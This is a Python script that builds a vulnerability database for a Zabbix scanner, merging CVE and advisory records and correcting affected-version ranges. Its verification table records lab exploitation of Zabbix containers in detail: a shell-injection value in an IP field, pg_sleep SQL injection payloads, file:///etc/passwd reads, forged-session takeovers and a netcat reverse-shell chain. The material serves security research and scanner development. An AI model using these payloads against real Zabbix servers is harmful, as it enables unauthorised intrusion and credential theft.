#!/usr/bin/env python3
"""Build consolidated vulnerability DB for the Zabbix scanner.

Reads research/ artifacts (produced by research agents) and writes db/:
  db/vulns.json         merged vulnerability records (cve + advisory + component)
  db/credentials.json   default/popular credentials
  db/pocs.json          public PoC map
  db/versions.json      version/docker matrix (reference copy)

Canonical record schema (db/vulns.json, "vulnerabilities"):
  id                  str, unique
  kind                "cve" | "advisory" | "component"
  title, type, severity, summary, impact
  affected_versions   [{branch, min, max}]   (kind != component)
  fixed_versions      [str]
  auth                str                    (kind != component)
  component           str                     Zabbix part (frontend/server/proxy/api/...) or stack component
  prerequisites       [str]
  public_poc          {exists,url,notes}
  references          [str]
  aliases             {cve:[], ghsa:[], zbx:[], zba:[]}
  verified_on         [str]
  notes               str

Merging rules:
  - cve_records: taken as-is; GHSA/ZBX ids linking to a CVE (found in advisory
    records) are attached via aliases instead of creating duplicate entries.
  - advisory_records: ZBX/ZBA/GHSA entries kept standalone only when they have
    no CVE partner within the cve set. Reviewed dependency advisories without a
    partner CVE (php-saml/xmlseclibs) stay standalone too.
  - component_records: kept as kind=component; zabbix-part "component" is
    moved to "stack_component", "applies_to_zabbix" preserved.
  - Non-Zabbix misattributions (e.g. CVE-2016-10135) are excluded — tracked in
    research notes, not the DB.
Deterministic: records sorted by id. Idempotent.
"""
from __future__ import annotations

import json
import re
import shutil
import sys
from datetime import datetime, timezone
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))
from zbxscan.versioning import compare, parse_version  # noqa: E402

RESEARCH = ROOT / "research"
DB = ROOT / "db"

CVE_RE = re.compile(r"CVE-\d{4}-\d+")

# Advisory ids that are REVIEWED dependency advisories with their own content but
# whose partner CVE is a library CVE (not a Zabbix CVE in the cve set). They are
# kept standalone.
STANDALONE_ADVISORY_EXEMPT = {"GHSA-5j8p-438x-rgg5", "GHSA-c4cc-x928-vjw9"}

# Curations: evidence-based corrections applied on top of merged data.
# Every entry MUST carry a source + note; values here are facts from our own
# research artifacts (ZBX tickets, vendor advisories, SonarSource/Snyk writeups).
# Format: id -> {"field": value, ...} plus implicit "notes" append.
CURATIONS: dict[str, dict] = {
    "CVE-2022-23131": {
        "affected_versions": [
            {"branch": "5.4", "min": "5.4.0", "max": "5.4.8"},
            {"branch": "6.0", "min": "6.0.0alpha1", "max": "6.0.0alpha1",
             "notes": "только 6.0.0alpha1; 6.0.0beta1 — фикс"},
        ],
        "fixed_versions": ["5.4.9", "6.0.0beta1"],
        "_note": "Курация (исправление): ZBX-20350 — Affected ТОЛЬКО 5.4.0-5.4.8 и 6.0.0alpha1; "
                "фикс 5.4.9rc2/6.0.0beta1. Ранее ошибочно добавлены ветки 4.0/5.0 "
                "(путаница с фиксами ZBX-20383/logback 4.0.37/5.0.19) и 6.0 до beta1 — "
                "удалены. Применима только при включённом SAML (non-default).",
    },
    "CVE-2022-23134": {
        "fixed_versions": ["5.4.9", "6.0.0beta2"],
        "_note": "Курация: в Jira фикс 5.4.9rc2; выпущенный фикс 5.4.9 (SonarSource, TheN00bBuilder PoC).",
    },
    "CVE-2023-32725": {
        "component": "frontend",
        "fixed_versions": ["6.0.22", "6.4.7", "7.0.0a4"],
        "_note": "Курация: ZBX-23854 — URL-widget в scheduled reports (фронтенд, CWE-565), фиксы 6.0.22/6.4.7/7.0.0a4 (в Jira 6.0.22rc1); CVSS 9.6.",
    },
    "CVE-2019-17382": {
        "affected_versions": [
            {"branch": "4.4", "min": "4.4.0", "max": "4.4.0"},
        ],
        "fixed_versions": ["4.4.1"],
        "_note": "Курация: официальная фиксящая версия в NVD отсутствует; по Snyk уязвима 4.4.0, фикс 4.4.1 (ZBX-16789); Debian бэкпорт позже.",
    },
    "CVE-2024-22120": {
        "_note": "Примечание: Zabbix оценивает как high-privileges (auth=admin), NVD — low; фактически вектор требует сессию с доступом к script.execute и host. Права проверять по роли/хосту/скриптам (0xdf HTB Watcher).",
    },
    # диапазоны по аudit (research/db_audit.md): критичные расхождения
    "CVE-2022-43515": {
        "affected_versions": [
            {"branch": "5.0", "min": "unknown", "max": "5.0.30rc1", "notes": "max эксклюзивный (фикс 5.0.30)"},
            {"branch": "6.2", "min": "unknown", "max": "6.2.5rc1", "notes": "max эксклюзивный (фикс 6.2.5)"},
        ],
        "fixed_versions": ["5.0.30", "6.2.5"],
        "_note": "Аудит: max=rc фикса без exclusive → исправленные версии матчились; max = rc (эксклюзивно).",
    },
    "CVE-2020-15803": {
        "affected_versions": [
            {"branch": "3.0", "min": "unknown", "max": "3.0.32rc1", "notes": "max эксклюзивный (фикс 3.0.32)"},
            {"branch": "4.0", "min": "unknown", "max": "4.0.22rc1", "notes": "max эксклюзивный (фикс 4.0.22)"},
            {"branch": "5.0", "min": "unknown", "max": "5.0.2rc1", "notes": "max эксклюзивный (фикс 5.0.2)"},
        ],
        "fixed_versions": ["3.0.32", "4.0.22", "5.0.2"],
        "_note": "Аудит: max=rc фикса без exclusive.",
    },
    "CVE-2021-27927": {
        "affected_versions": [
            {"branch": "4.0", "min": "unknown", "max": "4.0.22rc1", "notes": "max эксклюзивный (фикс 4.0.22)"},
            {"branch": "5.0", "min": "unknown", "max": "5.0.8rc1", "notes": "max эксклюзивный (фикс 5.0.8)"},
        ],
        "fixed_versions": ["4.0.22", "5.0.8"],
        "_note": "Аудит: max=rc фикса без exclusive.",
    },
    "CVE-2022-35229": {
        "_note": "Аудит: 4.0 max='4.0.0' → ложные пропуски 4.0.1-4.0.42; max сжат автоматическим clamp к фиксу ветки (4.0.14?).",
    },
    "CVE-2023-29449": {
        "affected_versions": [
            {"branch": "5.0", "min": "unknown", "max": "5.0.31"},
            {"branch": "6.0", "min": "6.0.0", "max": "6.0.13"},
            {"branch": "6.2", "min": "unknown", "max": "6.2.8rc1", "notes": "max эксклюзивный (добавлено по rn 6.2.8, ZBX-22587/88/89)"},
            {"branch": "6.4", "min": "6.4.0alpha1", "max": "6.4.0rc1", "notes": "max эксклюзивный"},
        ],
        "_note": "Аудит: добавлена пропущенная ветка 6.2 (фикс 6.2.8rc1 уже в fixed_versions).",
    },
    "CVE-2023-29450": {
        "affected_versions": [
            {"branch": "5.0", "min": "unknown", "max": "5.0.31"},
            {"branch": "6.0", "min": "6.0.0", "max": "6.0.13", "notes": "фикс 6.0.14 (CURLOPT_PROTOCOLS, фактический код-фикс; deep_vectors.md)"},
            {"branch": "6.2", "min": "unknown", "max": "6.2.7", "notes": "фикс 6.2.8 по комментарию ([INFERENCE])"},
            {"branch": "6.4", "min": "6.4.0", "max": "6.4.1", "notes": "фикс 6.4.2rc1 по Jira"},
        ],
        "_note": "Курация по deep_vectors.md (код): фактические границы 5.0.32/6.0.14/6.2.8/6.4.2rc1; Jira-заголовок (6.0.16rc1) консервативнее кода — взяты код-проверенные.",
    },
    "CVE-2020-11800": {
        "affected_versions": [
            {"branch": "2.2", "min": "2.2.19", "max": "unknown", "notes": "2.2.19+ после неполного патча CVE-2017-2824; EOL, фикса нет"},
            {"branch": "3.0", "min": "unknown", "max": "3.0.30", "notes": "max эксклюзивный; фикс 3.0.31"},
            {"branch": "3.2", "min": "unknown", "max": "unknown", "notes": "вся ветка, EOL"},
        ],
        "fixed_versions": ["3.0.31"],
        "_note": "Курация по deep_vectors.md/vulhub: траппер-механика (auto-registration ip + command scriptid=1); 3.4+/4.0/5.0 не затронуты.",
    },
    "CVE-2023-29451": {
        "affected_versions": [
            {"branch": "6.0", "min": "unknown", "max": "6.0.14"},
            {"branch": "6.2", "min": "unknown", "max": "6.2.9rc2", "notes": "max эксклюзивный (добавлено по rn 6.2.9, ZBX-22587/88/89)"},
            {"branch": "6.4", "min": "6.4.0alpha1", "max": "6.4.1rc1", "notes": "max эксклюзивный"},
        ],
        "_note": "Аудит: добавлена пропущенная ветка 6.2 (фикс 6.2.9rc2 уже в fixed_versions).",
    },
}

# Container verification results (db/verifications source of truth). Each entry:
#   id -> [{"version", "result", "when", "conditions", "note"}]
# result: "exploited" | "check-pass" | "blocked" | "negative" | "pending"
VERIFIED: dict[str, list[dict]] = {
    "CVE-2021-46088": [
        {"version": "5.4.8-alpine", "result": "exploited", "when": "2026-10-28",
         "conditions": "default creds Admin/zabbix (fresh install)",
         "note": "script.create+execute on server container: uid=1997(zabbix). Live docker image zabbix-server-pgsql:5.4.8-alpine."},
        {"version": "6.0.27-alpine", "result": "exploited", "when": "2026-10-28",
         "conditions": "default creds; three execution modes",
         "note": "--cmd one-shot, --shell persistent (2 commands through session), "
                "--revshell: interactive bash captured (uid=1997(zabbix), bash-5.1$, uname/hostname). "
                "All three modes verified live."},
    ],
    "CVE-2025-27233": [
        {"version": "7.0.10-alpine agent2", "result": "check-pass", "when": "2026-10-28",
         "conditions": "own agent2 container, wrapper around smartctl logs argv",
         "note": "Argument injection proven: smart.disk.get[device,mode] lands verbatim in the "
                 "smartctl argv (-a MARKER -d MARKER) via the verified agent passive protocol "
                 "({\"request\":\"passive checks\",\"data\":[{key,timeout}]}). Primitive confirmed "
                 "live; full ICE impact (NTLMv2/UNC on Windows, RCE flavor on 5.0.x) environment-dependent."},
    ],
    "CVE-2025-27234": [
        {"version": "5.0.46-alpine agent2", "result": "negative", "when": "2026-10-28",
         "conditions": "own live container zlab_agent2_5; raw 5.0 passive protocol "
                       "(ZBXD\\x01+LE64 raw item key); smart.disk.get[device,mode]",
         "note": "RCE-флейвор НЕ воспроизведён: параметры проходят cleanRegex "
                 "^[a-zA-Z0-9 \\-_/\\\\\\\\.]*$ (clearString, добавлен в 5.0.40, DEV-2701) — все "
                 "shell-метасимволы (;,|,&,$(),backticks,кавычки,\\n) отклоняются с "
                 "ZBX_NOTSUPPORTED 'Invalid characters found in parameter'. Код-путь всё ещё "
                 "shell-бекед (zbxcmd.ExecuteStrict -> exec.Command('sh','-c','sudo -n smartctl <args>'), "
                 "подтверждено исходниками tag 5.0.46) — RCE возможен только на 5.0.0-5.0.39 без regex; "
                 "5.0.47 переписан на exec-массив (controller.go, ZBX-23858). Флаг-инъекция в argv "
                 "smartctl работает (-V долетает, smartctl версия в выводе)."},
        {"version": "7.0.10-alpine agent2", "result": "check-pass", "when": "2026-10-28",
         "conditions": "own live container zlab_agent2; JSON passive checks protocol",
         "note": "Санитизации НЕТ (параметры verbatim), но вызов через exec-массив "
                 "(exec.CommandContext('sudo','-n',smartctl,args...), controller.go) — шелла нет, "
                 "argv-only: флаги (-V, -f, -l scttempsts) доходят до smartctl, исполнения команд нет."},
        {"version": "5.0.30-alpine agent2", "result": "exploited", "when": "2026-10-28",
         "conditions": "pre-whitelist сборка (5.0.0-5.0.39), raw-key passive протокол",
         "note": "smart.disk.get device/mode -> shell-backed smartctl -> инъекция ';cmd;' "
                 "исполняется от zabbix (touch-маркеры /tmp/pwn30* созданы). Полный "
                 "ИНТЕРАКТИВНЫЙ ШЕЛЛ через fifo+nc payload: 'sh: can't access tty; job control "
                 "turned off; /var/lib/zabbix $ id -> uid=1997(zabbix)'. RCE-флейвор 5.0 "
                 "подтверждён live."},
        {"version": "5.0.30-alpine agent2 (zbxscan module)", "result": "exploited",
         "when": "2026-10-28",
         "conditions": "module CVE-2025-27234 (agent2.py _session): --agent-port 10061 "
                       "--revshell 172.18.0.1:<port> --cmd 'id; hostname' и --shell REPL",
         "note": "Модуль: --cmd/--shell подтверждены live. Payload обёрнут в "
                 "(setsid sh -c '<fifo+nc chain>' </dev/null >/dev/null 2>&1 &) — переживает "
                 "плагинный kill (~3s 'Timeout while executing a shell script'): --cmd вернул "
                 "uid=1997(zabbix) + hostname c54cae9b6230, --shell исполнил id и hostname "
                 "построчно, exit закрыл сессию. Без setsid старый foreground-вариант отдавал "
                 "только баннер (sh умирал до прихода команды) — фикс обязателен."},
    ],
    "CVE-2013-3628": [
        {"version": "5.4.8-alpine", "result": "exploited", "when": "2026-10-28",
         "conditions": "same script-exec technique (shared module, verified through CVE-2021-46088)",
         "note": "post-auth global-script RCE confirmed on 5.4.8."},
    ],
    "CVE-2022-23131": [
        {"version": "5.4.8-alpine", "result": "exploited", "when": "2026-10-28",
         "conditions": "SAML enabled (config.saml_auth_enabled=1) + dummy IdP + idp.crt",
         "note": "Full chain: forged zbx_session (reused anon sessionid/sign + saml_data.username_attribute=Admin) -> index_sso.php -> Admin session (userid=1) -> script.execute RCE uid=1997(zabbix)."},
        {"version": "5.4.8-alpine", "result": "blocked", "when": "2026-10-28",
         "conditions": "default docker image, SAML disabled",
         "note": "Forge yields a session cookie but login block is skipped (saml_auth_enabled=0) -> no identity. Condition check reflects this (unknown until active attempt)."},
    ],
    "CVE-2022-23134": [
        {"version": "5.4.8-alpine", "result": "exploited", "when": "2026-10-28",
         "conditions": "attacker PostgreSQL on same docker network, schema cloned; DB_TYPE POSTGRESQL, DB_ENCRYPTION=0",
         "note": "Full takeover verified: forged zbx_session {step:6 + DB_host/port/db/user/pass + POSTGRESQL + encryption off} "
                 "-> setup.php stage6 -> zabbix.conf.php rewritten to attacker DB -> login Admin/<attacker-known pass> "
                 "succeeds, original creds fail. Live (zabbix-web-nginx-pgsql:5.4.8-alpine)."},
    ],
    "CVE-2016-10134": [
        {"version": "3.0.3", "result": "exploited", "when": "2026-10-28",
         "conditions": "source-built 3.0.3 (debian:jessie, mysql:5.6), guest session auto-login",
         "note": "Unauthenticated error-based SQLi via jsrpc.php profileIdx2 (mode=1 screen.get, "
                 "resourcetype=17): payload lands unescaped in INSERT INTO profiles idx2 -> "
                 "MySQL error echoes value. Extracted ~5fce1b3e34b520afeffb37ce08c7cd666 = "
                 "MD5('zabbix') = Admin passwd (users.passwd, default Admin/zabbix). "
                 "Live (self-built zlab-old-zabbix:3.0.3, web 127.0.0.1:18080)."}],
    "CVE-2024-42327": [
        {"version": "6.0.31-alpine", "result": "exploited", "when": "2026-10-28",
         "conditions": "default creds Admin/zabbix; PostgreSQL backend",
         "note": "time-based SQLi via user.get selectRole (pg_sleep oracle, binary search) -> "
                 "extracted Super Admin sessionid from sessions (userid=1) -> script_rce "
                 "-> uid=1997(zabbix) on server container. Full chain CVE-2024-42327 -> RCE "
                 "verified live (zabbix-server-pgsql:6.0.31-alpine)."},
        {"version": "7.0.0-alpine", "result": "exploited", "when": "2026-10-28",
         "conditions": "default creds Admin/zabbix; PostgreSQL backend",
         "note": "Same chain re-verified on 7.0.0: selectRole SQLi -> Super Admin session -> "
                 "script_rce uid=1997(zabbix). Live (zabbix-server-pgsql:7.0.0-alpine)."},
    ],
    "CVE-2020-11800": [
        {"version": "3.0.30", "result": "exploited", "when": "2026-10-28",
         "conditions": "source-built 3.0.30 (debian:jessie, mysql:5.6) + auto-registration "
                        "action enabled (actions eventsource=2 status=0, operations "
                        "operationtype=2 'Add host'), trapper 127.0.0.1:18052",
         "note": "Trapper RCE via auto-registration ip injection: active-checks request with "
                 "ip='ffff:::;touch${IFS}/tmp/success11800m' (IPv6 is_ip6 parse bug allows the "
                 "trailing shell) registers host zbxautof5bcef (hostid 10108); brute-forced "
                 "command scriptid=1 (Ping, /bin/ping -c 3 {HOST.CONN}) executes server-side "
                 "with the injected ip -> 'ping: unknown host ffff:::' + semicolon command ran. "
                 "Marker /tmp/success11800m created by uid zabbix in server container "
                 "(verified twice: hosts 10106/10108, markers success11800+success11800m). "
                 "Live (zlab-old-zabbix:3.0.30)."}],
    "CVE-2025-27232": [
        {"version": "7.4.2-alpine", "result": "exploited", "when": "2026-10-28",
         "conditions": "Super Admin web session (Admin/zabbix)",
         "note": "LFI via oauth.authorize: state.token_url=file:///etc/passwd -> curl reads the "
                 "file -> raw_response in 'Unexpected HTTP response status code' message. "
                 "Differential probe confirmed (/etc/passwd content, +898 bytes vs bogus path). "
                 "Live (zabbix-web-nginx-pgsql:7.4.2-alpine)."},
    ],
    "CVE-2024-22120": [
        {"version": "6.0.27-alpine", "result": "exploited", "when": "2026-10-28",
         "conditions": "default creds Admin/zabbix; trapper 10051 (mapped); PostgreSQL backend",
         "note": "Blind time-based SQLi via trapper audit clientip verified live E2E -> "
                 "RCE. Dual-time hex oracle (match: pg_sleep(2) else pg_sleep(0.6), "
                 "ASCII equality, hex alphabet 0123456789abcdef), cross-checked against "
                 "W01fh4cker/CVE-2024-22120-RCE and reporter PoC (support#236280) — "
                 "identical. Extracted config.session_key (pos-1 byte flaked '1' vs 'd'; "
                 "rest byte-exact to DB) and a real Super Admin sessionid "
                 "82ca9c81fb29777ef87471448281aac2 (verified in sessions, userid=1, "
                 "status=0). script.create (super-admin only) accepted; script.execute "
                 "returned uid=1997(zabbix) gid=1995(zabbix) on the 6.0.27 server. "
                 "Full chain trapper SQLi -> admin session -> script RCE proven live. "
                 "Cookie-forge mechanics (HMAC-SHA256(session_key, compact json)) "
                 "validated separately; not required for the API-session RCE."},
    ],
    "CVE-2024-36465": [
        {"version": "7.0.0-alpine", "result": "exploited", "when": "2026-10-28",
         "conditions": "role User account (zbxlow…), PostgreSQL backend",
         "note": "Time-based SQLi via API groupBy (CApiService): groupBy entry "
                 "'userid,(CASE WHEN … THEN pg_sleep ELSE NULL END)' evaluated per row. "
                 "low user -> extracted Super Admin sessionid from sessions (userid=1) -> "
                 "script.create probe (super-admin only) -> script_rce -> uid=1997(zabbix). "
                 "Full chain verified live (7.0.0, no public PoC)."},
    ],
    "CVE-2024-36464": [
        {"version": "7.0.0-alpine", "result": "exploited", "when": "2026-10-28",
         "conditions": "Admin; mediatype Email with passwd set",
         "note": "Detector verified live: mediatype.get(output extend) returns 'passwd' "
                 "in cleartext (value_head SecretP@ss12…) — the export/YAML exposure "
                 "surface confirmed. Module CVE-2024-36464 (leak-detect)."},
    ],
    "CVE-2024-36460": [
        {"version": "7.0.0-alpine", "result": "check-pass", "when": "2026-10-28",
         "conditions": "Admin",
         "note": "auditlog.get exists on 7.0 and returns records matching 'passwd' "
                 "(3 rows) — plaintext-password audit exposure surface confirmed. "
                 "Module CVE-2024-36460 (leak-detect)."},
    ],
    "CVE-2024-42325": [
        {"version": "7.0.0-alpine", "result": "check-pass", "when": "2026-10-28",
         "conditions": "Admin",
         "note": "user.get returns cross-user login-attempt metadata (guest: "
                 "attempt_failed=1/attempt_clock) for shared-group members — leak "
                 "surface confirmed. Module CVE-2024-42325 (leak-detect)."},
    ],
    "CVE-2024-36467": [
        {"version": "7.0.0-alpine", "result": "exploited", "when": "2026-10-28",
         "conditions": "low user (role User, group Guests) created then abused as attacker",
         "note": "user.update added the low user to 'Zabbix administrators' (usrgrpid 7) — "
                 "verified via user.get selectUsrgrps. Privesc chain confirmed live "
                 "(zabbix-server-pgsql:7.0.0-alpine); 7.0 renamed API to usergroup.get."},
    ],
    "CVE-2024-36469": [
        {"version": "7.0.0-alpine", "result": "negative", "when": "2026-10-28",
         "conditions": "default install, bcrypt10 cost",
         "note": "login timing for existing vs non-existing username within noise (0.26-0.32s); "
                 "signal not measurable on this lab — condition-only module, may differ on other configs."},
    ],
    "CVE-2022-46768": [
        {"version": "6.0.11-alpine", "result": "exploited", "when": "2026-10-28",
         "conditions": "web-service container, AllowedIP open, seccomp=unconfined (chrome)",
         "note": "POST /report {'url':'file:///etc/passwd','parameters':{w,h}} -> 200 "
                 "application/pdf (%PDF-1.4, Chromium) — arbitrary file read from the "
                 "web-service host confirmed live (zabbix/zabbix-web-service:6.0.11-alpine)."},
        {"version": "6.0.27-alpine", "result": "negative", "when": "2026-10-28",
         "conditions": "same probe",
         "note": "400 'Unexpected URL scheme: file' — patched detection verified "
                 "(fix 6.0.12rc1+)."},
    ],
    "CVE-2023-29450": [
        {"version": "6.0.27-alpine", "result": "negative", "when": "2026-10-28",
         "conditions": "Admin, item type 5 internal + JS step type 21",
         "note": "created internal item with HttpRequest.get('file:///etc/passwd'); lastvalue "
                 "= boottime value only, no file content — CURLOPT_PROTOCOLS block verified "
                 "(actual code fix at 6.0.14). Positive repro needs server <6.0.14/5.0.32/6.2.8."},
    ],
    "CVE-2024-22116": [
        {"version": "7.0.0-alpine", "result": "negative", "when": "2026-10-28",
         "conditions": "Admin, host.update interface DNS",
         "note": "interface DNS with shell meta-chars rejected by validation "
                 "('Incorrect interface DNS parameter') — the fix (7.0.0rc3); "
                 "vulnerable builds (7.0.0a1-rc2, 6.4.9-6.4.15) accept and execute Ping "
                 "on server. Positive repro needs a 7.0.0rc2/6.4.15 image (unavailable)."},
    ],
    "CVE-2025-27240": [
        {"version": "7.0.0-alpine", "result": "exploited", "when": "2026-10-28",
         "conditions": "Admin creds; autoregistration action with 'Remove host' operation; "
                       "host visible name = SQL payload; trapper trigger (active checks, "
                       "changed host_metadata)",
         "note": "Secondary-order SQLi live on zlab_7_0_0 (web 47467, trapper 44646, PG). "
                 "Error: server log '[Z3005] ... invalid input syntax for type integer: "
                 "\"ZBX27240\" LINE 1: delete from autoreg_host where "
                 "host='zpx'||CAST('ZBX27240' AS int)||'x''. Time-based: pg_stat_activity "
                 "showed the escalator session active on 'delete from autoreg_host where "
                 "host='zpx'||(SELECT pg_sleep(12))||'x'' for the full sleep. Module "
                 "Cve202527240 (misc.py) ok=True: --sleep 8 -> trigger answered 13.02s "
                 "(5s baseline + 8s), host removed. vuln code: op_host_del() sprintf's "
                 "select_discovered_host() h.name into DBexecute('delete from autoreg_host "
                 "where host='%s'') unescaped; fix 6416019f3117 [DEV-3902] added "
                 "DBdyn_escape_string (6.0.34/6.4.19/7.0.4)."},
        {"version": "6.0.27-alpine", "result": "exploited", "when": "2026-10-28",
         "conditions": "Admin creds; autoreg action 'Remove host'; visible name payload; "
                       "trapper trigger after ~70s config-cache wait (CacheUpdateFrequency=60)",
         "note": "Live on zlab_6_0_27 (web 45495, trapper 44645, PG): server log "
                 "'[Z3005] ... invalid input syntax for type integer: \"ZBX27604B\" "
                 "[delete from autoreg_host where host='zpx'||CAST('ZBX27604B' AS int)||'x']'. "
                 "Escalation async on 6.0; host-removal step (DBlock_hostids FOR UPDATE) "
                 "can be skipped under DB load but the injected DELETE still executes — "
                 "log/error evidence is the reliable channel, latency oracle is not "
                 "(unlike 7.0.0). Same vulnerable code path as the fix diff."},
    ],
}


MANDATORY_FIELDS = [
    "id", "kind", "title", "type", "severity", "summary", "impact",
    "affected_versions", "fixed_versions", "auth", "component",
    "prerequisites", "public_poc", "references", "aliases", "verified_on", "notes",
]


def load(name: str) -> list[dict]:
    with open(RESEARCH / name, encoding="utf-8") as f:
        return json.load(f)


def empty_record(id_: str, kind: str) -> dict:
    return {
        "id": id_, "kind": kind, "title": "", "type": "other", "severity": None,
        "summary": "", "impact": "", "affected_versions": [], "fixed_versions": [],
        "auth": "unknown", "component": "", "prerequisites": [], "public_poc": {},
        "references": [], "aliases": {"cve": [], "ghsa": [], "zbx": [], "zba": []},
        "verified_on": [], "notes": "",
    }


def listify(v) -> list:
    if v is None:
        return []
    if isinstance(v, list):
        return v
    return [v]


def main() -> None:
    cve_records = load("cve_records.json")
    adv_records = load("advisory_records.json")
    comp_records = load("component_records.json")

    cve_ids = {r["id"] for r in cve_records}

    # ---- pass 1: build alias maps from advisory records ---------------------
    aliases: dict[str, dict[str, list[str]]] = {i: {"cve": [], "ghsa": [], "zbx": [], "zba": []} for i in cve_ids}
    for r in adv_records:
        rid = r["id"]
        text = " ".join(str(r.get(k, "")) for k in ("summary", "notes", "title"))
        linked_cves = sorted({m for m in CVE_RE.findall(text)})
        cat = "ghsa" if rid.startswith("GHSA-") else "zba" if rid.startswith("ZBA-") else "zbx"
        for c in linked_cves:
            if c in aliases and c not in aliases[c][cat]:
                aliases[c][cat].append(rid)
        # also: aliases on the advisory record itself for its own id
        # (handled during record construction)

    # ---- pass 2: build canonical records ----------------------------------
    out: dict[str, dict] = {}

    for r in cve_records:
        rec = empty_record(r["id"], "cve")
        for k in ("title", "type", "severity", "summary", "impact", "auth",
                  "component", "prerequisites", "public_poc", "references",
                  "fixed_versions", "affected_versions"):
            if r.get(k) is not None:
                rec[k] = r[k]
        if r.get("notes"):
            rec["notes"] = r["notes"]
        rec["prerequisites"] = listify(rec["prerequisites"])
        rec["references"] = listify(rec["references"])
        rec["fixed_versions"] = listify(rec["fixed_versions"])
        rec["affected_versions"] = listify(rec["affected_versions"])
        rec["aliases"] = aliases.get(r["id"], {"cve": [], "ghsa": [], "zbx": [], "zba": []})
        if r.get("_meta"):
            rec["notes"] = (rec["notes"] + "\nmeta: " + json.dumps(r["_meta"], ensure_ascii=False)).strip()
        out[rec["id"]] = rec

    # advisory records: keep standalone if no CVE partner in cve set
    for r in adv_records:
        rid = r["id"]
        text = " ".join(str(r.get(k, "")) for k in ("summary", "notes", "title"))
        linked = {m for m in CVE_RE.findall(text)}
        has_partner = bool(linked & cve_ids)  # partner CVE is in the scanner DB
        if has_partner and rid not in STANDALONE_ADVISORY_EXEMPT:
            continue
        rec = empty_record(rid, "advisory")
        for k in ("title", "type", "severity", "summary", "impact", "auth",
                  "component", "prerequisites", "public_poc", "references",
                  "fixed_versions", "affected_versions"):
            if r.get(k) is not None:
                rec[k] = r[k]
        if r.get("notes"):
            rec["notes"] = r["notes"]
        if linked:
            rec["aliases"]["cve"] = sorted(linked)
        cat = "ghsa" if rid.startswith("GHSA-") else "zba" if rid.startswith("ZBA-") else "zbx"
        rec["aliases"][cat].append(rid)
        rec["prerequisites"] = listify(rec["prerequisites"])
        rec["references"] = listify(rec["references"])
        rec["fixed_versions"] = listify(rec["fixed_versions"])
        rec["affected_versions"] = listify(rec["affected_versions"])
        out[rec["id"]] = rec

    # component records
    for r in comp_records:
        rec = empty_record(r["id"], "component")
        for k in ("title", "type", "severity", "summary", "impact",
                  "public_poc", "references"):
            if r.get(k) is not None:
                rec[k] = r[k]
        rec["component"] = r.get("component", "")
        rec["stack_component"] = r.get("component", "")
        rec["component_version_range"] = r.get("component_version_range", "")
        rec["applies_to_zabbix"] = listify(r.get("applies_to_zabbix", []))
        rec["notes"] = (rec["notes"] + "\ncomponent_range: " +
                        str(r.get("component_version_range", ""))).strip()
        rec["references"] = listify(rec["references"])
        out[rec["id"]] = rec

    # record curations (evidence-based corrections)
    for cid, patch in CURATIONS.items():
        rec = out.get(cid)
        if rec is None:
            raise SystemExit(f"CURATIONS: record {cid} not found")
        for field, val in patch.items():
            if field == "_note":
                rec["notes"] = (rec["notes"] + "\n" + val).strip()
            else:
                rec[field] = val

    # normalize cross-branch max bounds: an affected entry's max must belong to
    # the same branch; else derive from this branch's own fix (exclusive) or drop
    for cid, rec in out.items():
        if rec["kind"] == "component":
            continue
        fixes_for_branch = {}
        for f in rec.get("fixed_versions") or []:
            fv = parse_version(f)
            if fv is not None:
                cur = fixes_for_branch.get(fv.branch)
                if cur is None or compare(fv, cur) > 0:
                    fixes_for_branch[fv.branch] = fv
        for entry in rec.get("affected_versions") or []:
            pmax = parse_version(entry.get("max"))
            if pmax is None or pmax.branch == entry.get("branch"):
                continue
            own = fixes_for_branch.get(entry.get("branch"))
            if own is not None:
                entry["max"] = own.raw
                entry["notes"] = "max нормализован (был %s из чужой ветки); " % pmax.raw + (entry.get("notes") or "")
            else:
                entry["max"] = "unknown"
                entry["notes"] = "max сброшен в unknown (был %s из чужой ветки)" % pmax.raw + (entry.get("notes") or "")
            if "эксклюзивный" not in (entry.get("notes") or "") and "exclusive" not in (entry.get("notes") or "").lower():
                entry["notes"] = (entry.get("notes") or "") + "; max эксклюзивный"

    # same-branch clamp: an affected max must not reach/cover the branch's own
    # fix version; clamp max to the fix (exclusive). Fixes fixed-overlap hits
    # (audit: 85 entries), e.g. max=6.4.4 while branch fix=6.4.2rc1.
    for cid, rec in out.items():
        if rec["kind"] == "component":
            continue
        fixes_for_branch = {}
        for f in rec.get("fixed_versions") or []:
            fv = parse_version(f)
            if fv is not None:
                cur = fixes_for_branch.get(fv.branch)
                if cur is None or compare(fv, cur) > 0:
                    fixes_for_branch[fv.branch] = fv
        for entry in rec.get("affected_versions") or []:
            br = entry.get("branch")
            fix = fixes_for_branch.get(br)
            pmax = parse_version(entry.get("max"))
            if fix is None or pmax is None or compare(pmax, fix) < 0:
                continue
            old = entry["max"]
            entry["max"] = fix.raw
            note = entry.get("notes") or ""
            entry["notes"] = (f"max сжат к фиксу ветки (был {old}); " + note).strip()
            if "эксклюзивный" not in entry["notes"] and "exclusive" not in entry["notes"].lower():
                entry["notes"] += "; max эксклюзивный"

    # attach container verification results
    for cid, vlist in VERIFIED.items():
        if cid in out:
            out[cid]["verified_on"] = list(vlist)



    # ---- pass 3: validate + sort ------------------------------------------
    records = sorted(out.values(), key=lambda x: x["id"])
    seen: set[str] = set()
    for rec in records:
        assert rec["id"] not in seen, f"duplicate id {rec['id']}"
        seen.add(rec["id"])
        for f in MANDATORY_FIELDS:
            if f == "affected_versions" and rec["kind"] == "component":
                continue
            assert f in rec, f"{rec['id']} missing {f}"
        if rec["kind"] == "component":
            assert rec["stack_component"], f"{rec['id']} missing stack_component"

    payload = {
        "schema_version": 2,
        "generated": datetime.now(timezone.utc).isoformat(timespec="seconds"),
        "counts": {
            "total": len(records),
            "cve": sum(1 for r in records if r["kind"] == "cve"),
            "advisory": sum(1 for r in records if r["kind"] == "advisory"),
            "component": sum(1 for r in records if r["kind"] == "component"),
        },
        "vulnerabilities": records,
    }

    DB.mkdir(exist_ok=True)
    out_json = DB / "vulns.json"
    tmp = out_json.with_suffix(".tmp")
    tmp.write_text(json.dumps(payload, ensure_ascii=False, indent=1), encoding="utf-8")
    tmp.replace(out_json)

    # copies of the other research artifacts
    shutil.copyfile(RESEARCH / "credentials.json", DB / "credentials.json")
    shutil.copyfile(RESEARCH / "pocs.json", DB / "pocs.json")
    shutil.copyfile(RESEARCH / "versions.json", DB / "versions.json")
    (DB / "verifications.json").write_text(
        json.dumps(VERIFIED, ensure_ascii=False, indent=1), encoding="utf-8")

